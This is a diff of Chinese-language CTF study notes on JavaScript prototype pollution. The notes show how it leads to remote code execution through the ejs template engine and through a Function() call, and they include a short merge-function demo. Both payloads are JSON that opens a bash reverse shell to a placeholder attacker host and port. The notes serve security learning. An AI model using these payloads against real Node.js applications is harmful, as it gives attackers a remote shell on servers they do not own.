@@ -106,17 +106,34 @@ object2是object2['__proto__']， 就是{ ctfshow: "36dboy" }。此时 key为 ct
 
 ^
 ## **原型链污染组合**
-ejs模板漏洞导致rce
+**ejs模板漏洞导致rce**
 ```
 {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
 ```
 
+
 ^
-污染函数创建的函数体，变成危险函数
+**污染函数Function创建的函数体，变成危险函数**
 ```
 已知返回res.render('api', { query: Function(query)(query)});
 ```
 污染query参数即可
 ```
 {"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"')"}}
+
+案例：
+function copy(object1, object2){
+    for (let key in object2) {
+        if (key in object2 && key in object1) {
+            copy(object1[key], object2[key])
+        } else {
+            object1[key] = object2[key]
+        }
+    }
+  }
+ var user ={}
+ body=JSON.parse('{"__proto__":{"query":"return 123"}}');
+ copy(user,body);
+ console.log(Function(query)(query));
+//输出 123
 ```
